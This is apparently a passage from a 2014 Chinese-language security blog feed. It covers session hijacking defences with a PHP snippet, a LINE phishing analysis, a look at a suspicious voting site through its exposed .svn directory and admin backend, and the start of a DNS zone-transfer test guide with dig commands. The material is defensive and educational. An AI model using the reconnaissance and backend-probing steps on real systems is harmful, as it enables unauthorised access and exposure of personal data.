&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;大家還記得四月份的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件嗎？當時除了網站本身以外，受害最嚴重的就屬 VPN Server 了。國內外不少駭客不眠不休利用 Heartbleed 漏洞竊取 VPN Server 的管理者 Session Cookie，運氣好的話就可以直接登入大企業的內網。&lt;/p&gt;

&lt;p&gt;但是，其實這樣的風險是可以避免的，今天我們以開發者的角度來談談 Session 的攻擊與防護。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;session-cookie&quot;&gt;什麼是 Session？什麼是 Cookie？&lt;/h3&gt;

&lt;p&gt;在談 Session 之前，我們要先瞭解 Cookie。你知道網站是如何辨識我們的身份嗎？為什麼我們輸入完帳號密碼之後，網站就知道我們是誰呢？就是利用 Cookie。Cookie 是網站在瀏覽器中存放的資料，內容包括使用者在網站上的偏好設定、或者是登入的 Session ID。網站利用 Session ID 來辨認訪客的身份。&lt;/p&gt;

&lt;p&gt;Cookie 既然存放在 Client 端，那就有被竊取的風險。例如透過 &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting（跨站腳本攻擊，又稱 XSS）&lt;/a&gt;，攻擊者可以輕易竊取受害者的 Cookie。如果 Cookie 被偷走了，你的身份就被竊取了。&lt;/p&gt;

&lt;p&gt;我們可以用一個譬喻來表示：你加入了一個秘密俱樂部，填寫完會員資料後，得到了一張會員卡。之後只要憑這張會員卡，就可以進入這個俱樂部。但是隔天，你的會員卡掉了。撿走你會員卡的人，就可以用你的會員卡進入這個秘密俱樂部，因為會員卡上沒有你的照片或是其他足以辨識身分的資訊。這就像是一個會員網站，我們申請了一個帳號（填寫會員資料加入俱樂部），輸入帳號密碼登入之後，得到一組 Cookie，其中有 Session ID 來辨識你的身分（透過會員卡來辨識身分）。今天如果 Cookie 被偷走了（會員卡被撿走了），別人就可以用你的帳號來登入網站（別人用你的會員卡進入俱樂部）。&lt;/p&gt;

&lt;p&gt;Session 攻擊手法有三種：
1. 猜測 Session ID (Session Prediction)
2. 竊取 Session ID (Session Hijacking)
3. 固定 Session ID (Session Fixation)&lt;/p&gt;

&lt;p&gt;我們以下一一介紹。&lt;/p&gt;

&lt;h4 id=&quot;session-prediction--session-id&quot;&gt;Session Prediction (猜測 Session ID)&lt;/h4&gt;

&lt;p&gt;Session ID 如同我們前面所說的，就如同是會員卡的編號。只要知道 Session ID，就可以成為這個使用者。如果 Session ID 的長度、複雜度、雜亂度不夠，就能夠被攻擊者猜測。攻擊者只要寫程式不斷暴力計算 Session ID，就有機會得到有效的 Session ID 而竊取使用者帳號。&lt;/p&gt;

&lt;p&gt;分析 Session ID 的工具可以用以下幾種
1. &lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project&quot;&gt;OWASP WebScarab&lt;/a&gt;
2. &lt;a href=&quot;http://lcamtuf.coredump.cx/soft/stompy.tgz&quot;&gt;Stompy&lt;/a&gt;
3. &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;觀察 Session ID 的亂數分布，可以了解是否能夠推出規律、猜測有效的 Session ID。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-0tLscJj_r_E/U3VCmkcvcCI/AAAAAAAAAZo/bChmIZvZZCg/s2400/2014-05-16-http-session-protection-03-session-id-analysis.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-0tLscJj_r_E/U3VCmkcvcCI/AAAAAAAAAZo/bChmIZvZZCg/w700-h388-no/2014-05-16-http-session-protection-03-session-id-analysis.jpg&quot; alt=&quot;分析 Session ID&quot; title=&quot;分析 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;使用 Session ID 分析程式進行分析，評估是否無法被預測。如果沒有 100% 的把握自己撰寫的 Session ID 產生機制是安全的，不妨使用內建的 Session ID 產生 function，通常都有一定程度的安全。&lt;/p&gt;

&lt;h4 id=&quot;session-hijacking--session-id&quot;&gt;Session Hijacking (竊取 Session ID)&lt;/h4&gt;

&lt;p&gt;竊取 Session ID 是最常見的攻擊手法。攻擊者可以利用多種方式竊取 Cookie 獲取 Session ID：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;跨站腳本攻擊 (&lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting (XSS)&lt;/a&gt;)：利用 XSS 漏洞竊取使用者 Cookie&lt;/li&gt;
  &lt;li&gt;網路竊聽：使用 ARP Spoofing 等手法竊聽網路封包獲取 Cookie&lt;/li&gt;
  &lt;li&gt;透過 Referer 取得：若網站允許 Session ID 使用 URL 傳遞，便可能從 Referer 取得 Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;竊取利用的方式如下圖：&lt;/p&gt;

&lt;p&gt;受害者已經登入網站伺服器，並且取得 Session ID，在連線過程中攻擊者用竊聽的方式獲取受害者 Session ID。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-glmPtR_Erp0/U3VCmo0w9yI/AAAAAAAAAZk/4rP1hOOC5W8/s2400/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-glmPtR_Erp0/U3VCmo0w9yI/AAAAAAAAAZk/4rP1hOOC5W8/w600-no/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;竊取 Session ID&quot; title=&quot;竊取 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;攻擊者直接使用竊取到的 Session ID 送至伺服器，偽造受害者身分。若伺服器沒有檢查 Session ID 的使用者身分，則可以讓攻擊者得逞。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/--Si53ercaV0/U3VCmfP_ZKI/AAAAAAAAAZg/-Dirb4AYKGk/s2400/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/--Si53ercaV0/U3VCmfP_ZKI/AAAAAAAAAZg/-Dirb4AYKGk/w600/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;偽造 Session ID&quot; title=&quot;偽造 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;禁止將 Session ID 使用 URL (GET) 方式來傳遞&lt;/li&gt;
  &lt;li&gt;設定加強安全性的 Cookie 屬性：HttpOnly (無法被 JavaScript 存取)&lt;/li&gt;
  &lt;li&gt;設定加強安全性的 Cookie 屬性：Secure (只在 HTTPS 傳遞，若網站無 HTTPS 請勿設定)&lt;/li&gt;
  &lt;li&gt;在需要權限的頁面請使用者重新輸入密碼&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;session-fixation--session-id&quot;&gt;Session Fixation (固定 Session ID)&lt;/h4&gt;

&lt;p&gt;攻擊者誘使受害者使用特定的 Session ID 登入網站，而攻擊者就能取得受害者的身分。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;攻擊者從網站取得有效 Session ID&lt;/li&gt;
  &lt;li&gt;使用社交工程等手法誘使受害者點選連結，使用該 Session ID 登入網站&lt;/li&gt;
  &lt;li&gt;受害者輸入帳號密碼成功登入網站&lt;/li&gt;
  &lt;li&gt;攻擊者使用該 Session ID，操作受害者的帳號&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-qAizYyaOoRo/U3Vaaw6lqsI/AAAAAAAAAZ4/GNO7z3T6Mjg/s2400/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-qAizYyaOoRo/U3Vaaw6lqsI/AAAAAAAAAZ4/GNO7z3T6Mjg/w904-h678-no/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在使用者登入成功後，立即更換 Session ID，防止攻擊者操控 Session ID 給予受害者。&lt;/li&gt;
  &lt;li&gt;禁止將 Session ID 使用 URL (GET) 方式來傳遞&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;session-&quot;&gt;Session 防護&lt;/h3&gt;

&lt;p&gt;那要怎麼防範攻擊呢？當然會有人說，會員卡不要掉不就沒事了嗎？當然我們沒辦法確保用戶不會因為各種方式導致 Cookie 遭竊（XSS、惡意程式等），因此最後一道防線就是網站的 Session 保護。一張會員卡上如果沒有任何可識別的個人資料，當然任何人撿去了都可以用。如果上面有照片跟簽名呢？偷走會員卡的人在進入俱樂部的時候，在門口就會因為照片跟本人不符而被擋下來。Session 保護也是一樣，怎麼讓我們的 Session 保護機制也能辨識身分呢？答案是利用每個使用者特有的識別資訊。&lt;/p&gt;

&lt;p&gt;每個使用者在登入網站的時候，我們可以用每個人特有的識別資訊來確認身分：
1. 來源 IP 位址
2. 瀏覽器 User-Agent&lt;/p&gt;

&lt;p&gt;如果在同一個 Session 中，使用者的 IP 或者 User-Agent 改變了，最安全的作法就是把這個 Session 清除，請使用者重新登入。雖然使用者可能因為 IP 更換、Proxy 等因素導致被強制登出，但為了安全性，便利性必須要與之取捨。以 PHP 為例，我們可以這樣撰寫：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== $_SESSION[&amp;#39;LAST_REMOTE_ADDR&amp;#39;] || $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] !== $_SESSION[&amp;#39;LAST_USER_AGENT&amp;#39;]) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   session_destroy();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;session_regenerate_id();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_SESSION[&amp;#39;LAST_REMOTE_ADDR&amp;#39;] = $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_SESSION[&amp;#39;LAST_USER_AGENT&amp;#39;] = $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;除了檢查個人識別資訊來確認是否盜用之外，也可以增加前述的 Session ID 的防護方式：
1. Cookie 設定 Secure Flag (HTTPS)
2. Cookie 設定 HTTP Only Flag
3. 成功登入後立即變更 Session ID&lt;/p&gt;

&lt;p&gt;Session 的清除機制也非常重要。當伺服器偵測到可疑的使用者 Session 行為時，例如攻擊者惡意嘗試偽造 Session ID、使用者 Session 可能遭竊、或者逾時等情況，都應該立刻清除該 Session ID 以免被攻擊者利用。&lt;/p&gt;

&lt;p&gt;Session 清除機制時機：
1. 偵測到惡意嘗試 Session ID 
2. 識別資訊無效時
3. 逾時&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;管理者有避免使用者帳號遭竊的責任&lt;/h3&gt;

&lt;p&gt;使用者帳號遭竊一直以來都是顯著的問題，但卻鮮少有網站針對 Session 的機制進行保護。攻擊者可以輕鬆使用 &lt;a href=&quot;http://codebutler.github.io/firesheep/&quot;&gt;firesheep&lt;/a&gt; 之類的工具竊取帳號。國外已經有不少網站偵測到 Session 可能遭竊時將帳號強制登出，但國內目前還鮮少網站實作此防禦，設備商的 Web 管理介面更少針對 Session 進行保護。如果 VPN Server 等設備有偵測 Session ID 的偽造，在 &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件時就不會有那麼慘重的損失了。&lt;/p&gt;

&lt;p&gt;立刻把自己的網站加上 Session 保護機制吧！&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>LINE 免費貼圖釣魚訊息分析</title>
   <link href="http://devco.re/blog/2014/05/12/line-phishing/"/>
   <updated>2014-05-12T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/05/12/line-phishing</id>
   <content type="html">
&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ynmXJsHIv0w/U2kPLvxOvkI/AAAAAAAAAUw/qG0y0Ahcf44/s2560/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ynmXJsHIv0w/U2kPLvxOvkI/AAAAAAAAAUw/qG0y0Ahcf44/w381-h677-no/LINE_Phishing_01.png&quot; alt=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; title=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;此 LINE 釣魚訊息說只要幫忙轉發 15 次訊息，就會贈送貼圖。先不論 LINE 有沒有這樣的機制，我們先直接點選連結看看葫蘆裡賣什麼藥。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hBW82hxnHIE/U2kPLgV2BSI/AAAAAAAAAU4/wpXMZ7eVtqU/s2560/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hBW82hxnHIE/U2kPLgV2BSI/AAAAAAAAAU4/wpXMZ7eVtqU/w381-h677-no/LINE_Phishing_02.png&quot; alt=&quot;LINE 釣魚假貼圖網頁&quot; title=&quot;LINE 釣魚假貼圖網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;瀏覽器打開之後，跳出了領取貼圖的「網頁」，而且還有詭異的紅字。各種跡象都跟一般領取貼圖的模式不同，太令人起疑了。點了圖就會跳到 Facebook 登入頁面。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/--bO6e0Rrqwc/U2kPLHyDyCI/AAAAAAAAAUk/a4qob4-uzPI/s2560/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/--bO6e0Rrqwc/U2kPLHyDyCI/AAAAAAAAAUk/a4qob4-uzPI/w381-h677-no/LINE_Phishing_03.png&quot; alt=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; title=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;明眼人看到這個 Facebook 登入頁面就會發現太假了，破綻多多。Logo、網址、網頁格式破板、簡體字，太多令人懷疑的地方了。在這邊我們只要隨便輸入帳號跟密碼，就能到下個畫面。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-gCfMgE3Jp3A/U2kPMJmUgYI/AAAAAAAAAUs/WuzFRNt3LXI/s2560/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-gCfMgE3Jp3A/U2kPMJmUgYI/AAAAAAAAAUs/WuzFRNt3LXI/w381-h677-no/LINE_Phishing_04.png&quot; alt=&quot;假 Facebook 登入完成頁面&quot; title=&quot;假 Facebook 登入完成頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;結果當然是不會給你貼圖啦！而且網址「cuowu」是「錯誤」的拼音，也暴露了網站作者的身分。直接用瀏覽器看傳遞的頁面叫做「tj.asp」，「tj」正好是「提交」，畫面上的錯誤訊息更是大剌剌的直接秀出簡體字。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-4oNH9XJfjG0/U2kPMrUGMVI/AAAAAAAAAU0/kHzzJHSlNvM/s2560/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-4oNH9XJfjG0/U2kPMrUGMVI/AAAAAAAAAU0/kHzzJHSlNvM/w786-h647-no/LINE_Phishing_05.png&quot; alt=&quot;釣魚網站網頁訊息&quot; title=&quot;釣魚網站網頁訊息&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;事後友人直接說 LINE 帳號被盜用發訊息了，而且密碼可能過於簡單、也沒有設定換機密碼。因此在這邊呼籲大家做好 LINE 的安全設定：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;加強密碼長度、複雜度&lt;/li&gt;
  &lt;li&gt;設定「換機密碼」&lt;/li&gt;
  &lt;li&gt;若只在手機使用 LINE，可將「允許自其他裝置登入」關閉&lt;/li&gt;
  &lt;li&gt;如果有帳號被盜狀況，趕快聯絡 LINE &lt;a href=&quot;https://line.naver.jp/cs/&quot;&gt;https://line.naver.jp/cs/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;大家在享受通訊軟體與朋友傳訊貼圖的同時，也必須要注意有心人士利用這些管道竊取你的帳號密碼喔！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>搶搭核四與服貿熱潮的潛在詐騙網站</title>
   <link href="http://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/"/>
   <updated>2014-05-07T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</id>
   <content type="html">
&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;

&lt;p&gt;最近很多人都收到了一個看起來很像釣魚網站的核四投票站台簡訊，如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/1mICaXeUMYfM-dYj4k4_9IUx9COR_JNienon7uCmV6A=w640-h960-no&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/1mICaXeUMYfM-dYj4k4_9IUx9COR_JNienon7uCmV6A=w640-h960-no&quot; alt=&quot;核四投票站台簡訊&quot; title=&quot;核四投票站台簡訊&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我們也收到了，但是剛吃飽飯實在很想睡覺，不太想理他，於是就忍不住趴下睡覺，竟然做了個夢…..&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section&quot;&gt;站台內容&lt;/h3&gt;

&lt;p&gt;在夢中手滑打開了網頁，內容長得像這個樣子：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-7tfQUJc6KgA/U2n78VE73QI/AAAAAAAAAYM/DPkIs4YN26o/w1138-h551-no/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-7tfQUJc6KgA/U2n78VE73QI/AAAAAAAAAYM/DPkIs4YN26o/w1138-h551-no/2.vote.tw.am_votepage.png&quot; alt=&quot;核四投票站台頁面&quot; title=&quot;核四投票站台頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看了真是非常的義憤填膺！馬上就想投下神聖的一票！但是忽然聽到周公指示說網站底下有奇怪的目錄，照著神諭一試，發現有 .svn 目錄跟 entries 檔！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-3fhvgOCVCFM/U2ncN_N5-pI/AAAAAAAAAV8/0_CLdKmKGqY/w1138-h337-no/3.svn_entries.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3fhvgOCVCFM/U2ncN_N5-pI/AAAAAAAAAV8/0_CLdKmKGqY/w1138-h337-no/3.svn_entries.png&quot; alt=&quot;.svn 目錄&quot; title=&quot;.svn 目錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這時候三太子哪吒剛好路過，說他剛剛在 Pastebin 看到有人貼了&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;一篇跟這個網站好像有關聯的內容&lt;/a&gt;，講完他就開著水車跑去鎮壓龍宮了。點開那篇內容一看，內容有一些很奇怪的網址，讓人看了就很想點！隨便選了一個 http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php 打開來看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-Sc_wLFVIvxE/U2ncOtHzfvI/AAAAAAAAAWI/plfXjqZyIuo/w1138-h406-no/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Sc_wLFVIvxE/U2ncOtHzfvI/AAAAAAAAAWI/plfXjqZyIuo/w1138-h406-no/4.vote.tw.am_homepage.png&quot; alt=&quot;投票項目&quot; title=&quot;投票項目&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;哇塞！原來從服貿就已經開始了呢！讓我們繼續點進去看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-MYM6cr6quQA/U2ncOzrIF4I/AAAAAAAAAWg/hTfMXuiUtuQ/w1138-h455-no/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-MYM6cr6quQA/U2ncOzrIF4I/AAAAAAAAAWg/hTfMXuiUtuQ/w1138-h455-no/5.vote.tw.am_navigation.png&quot; alt=&quot;投票結果導覽頁面&quot; title=&quot;投票結果導覽頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看起來是個後台，可以瀏覽使用者的投票記錄、留言等資料，那就點個投票記錄來看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-ZsqRx5Ozaso/U2ncO0-8QtI/AAAAAAAAAWc/FpWLh6APufI/w1138-h882-no/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-ZsqRx5Ozaso/U2ncO0-8QtI/AAAAAAAAAWc/FpWLh6APufI/w1138-h882-no/6.vote.tw.am_vote_record.png&quot; alt=&quot;投票記錄&quot; title=&quot;投票記錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;果然裡面存著眾多民眾的投票記錄，那麼用戶反饋應該就是留言了…&lt;/p&gt;

&lt;p&gt;從這些內容看來，應該是有個集團擁有大量的民眾個資，並且一一發送訊息給這些人，背後目的尚不得而知。有可能是大陸人想利用這個熱潮確認這些電話號碼是否真實、可用，也有可能是不知名的黑手正在策劃下一個打壓動作？正當我們想搞清楚對方究竟是透過電話號碼還是信箱傳送 iMessage 時，哪吒忽然又路過了，丟了這張圖之後叫我們不要再瞎忙了趕快回家洗洗睡：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-UhhmGb1Smuc/U2nlje28okI/AAAAAAAAAXQ/XbRkf8djtqg/w951-h855-no/7.%25E8%25A9%2590%25E9%25A8%2599.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-UhhmGb1Smuc/U2nlje28okI/AAAAAAAAAXQ/XbRkf8djtqg/w951-h855-no/7.%25E8%25A9%2590%25E9%25A8%2599.png&quot; alt=&quot;IP、時間、電話、回應內容等資料&quot; title=&quot;IP、時間、電話、回應內容等資料&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;果然有電話！究竟這件事，是有網站大量洩漏個資，還是有人在民運期間利用這股熱潮蒐集個資，抑或是背後有什麼不可告人的秘密呢？讓我們繼續看下去～&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;夢醒時分&lt;/h3&gt;

&lt;p&gt;上班時間不能午睡太久，於是周公就把我們叫醒了…..&lt;/p&gt;

&lt;p&gt;對於這樣的夢境我們有以下建議：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;不要隨意點擊來路不明的簡訊內容&lt;/li&gt;
  &lt;li&gt;在網路上填寫任何內容之前先查證該網站是否可疑&lt;/li&gt;
  &lt;li&gt;對於 yijapperj@hotmail.com 這種可疑帳號所傳來的任何資料，請保持高度警戒&lt;/li&gt;
  &lt;li&gt;對於 vote.tw.am 這種看起來疑似要偽裝成 .tw 網域的站台，也請保持高度警戒&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;歡迎大家轉發這個消息到各大網站、粉絲團、BBS，告訴各個熱心公益的鄉民們別再點擊與回應來路不明的簡訊囉！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題</title>
   <link href="http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/"/>
   <updated>2014-05-05T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</id>
   <content type="html">
&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; 是在 1983 年由 Paul Mockapetris 所發明，相關規範分別在 &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; 以及 &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;。其主要作用是用來記憶 IP 位址與英文之間的對應關係，讓人類可以用較簡單的方式記得主機名稱。目前一般民眾大多使用 ISP 或國際知名公司提供的 DNS server，如中華的 168.95.1.1 或是 Google 的 8.8.8.8 等等。&lt;/p&gt;

&lt;p&gt;然而對於企業而言，可能需要架設大量機器或內部系統，又希望以簡單的方式記憶主機名稱，因此許多企業有自行架設 DNS server 的需求。同時企業通常也會建立幾台備援 DNS server，以避免 DNS 服務忽然中斷。但是當企業有多台 DNS server 時，就必須考量 DNS 記錄的同步問題，通常會使用 &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS_zone_transfer&quot;&gt;zone transfer&lt;/a&gt; 這個功能來同步記錄。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;然而若管理者未做好相關設定，使所有來源皆可對企業的 DNS 主機進行 zone transfer 查詢，則有機會讓此功能成為企業遭受攻擊的起點。用現實生活情境舉例的話，對外開放 zone transfer 就如同所有人都可以任意查詢你名下的所有房地產位在何處，假如有人要針對性的攻擊你，隨時都可以去看你某個房地產有沒有哪扇門窗沒關好，伺機入侵你的家園。一般我們對企業資訊系統進行&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;時，在資訊搜集的階段也會先從 domain name 下手，因此 DNS 相關資料的重要性可見一斑。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0532&quot;&gt;Zone transfer 的資安議題早在 1999 年就已有人提出&lt;/a&gt;，理應成為各企業進行資安稽核的步驟之一。然而十五年過去了，在近期我們卻發現許多國內大企業仍有此問題，令人非常驚訝！究竟企業該如何檢測自身是否存在這種安全漏洞？此問題目前在台灣網路環境佔有多大的比例？Zone transfer 會對企業造成什麼影響？讓我們繼續看下去～&lt;/p&gt;

&lt;h3 id=&quot;zone-transfer-&quot;&gt;Zone Transfer 檢測方式&lt;/h3&gt;

&lt;p&gt;首先需感謝 &lt;a href=&quot;http://www.digininja.org/&quot;&gt;DigiNinja&lt;/a&gt; 提供了一個&lt;a href=&quot;http://www.digininja.org/projects/zonetransferme.php&quot;&gt;讓大家自由測試的 zonetransfer.me 網域&lt;/a&gt;，以下我們分別在 Linux 及 Windows 環境下進行檢測。&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;在 Linux 環境內，我們可利用 &lt;a href=&quot;http://linux.vbird.org/linux_server/0350dns.php#dig&quot;&gt;dig&lt;/a&gt; 指令查詢目標 domain 使用哪些 name server：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig +nostats +nocomments +nocmd NS zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Name server 查詢結果：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zonetransfer.me.		IN	NS
zonetransfer.me.	7118	IN	NS	ns12.zoneedit.com.
zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;從結果可得知有 ns12.zoneedit.com 或 ns16.zoneedit.com 這兩個 DNS server，接著我們即可測試是否可從外部網路對這兩個 DNS server 進行 zone transfer，測試方式如下：&lt;/p&gt;

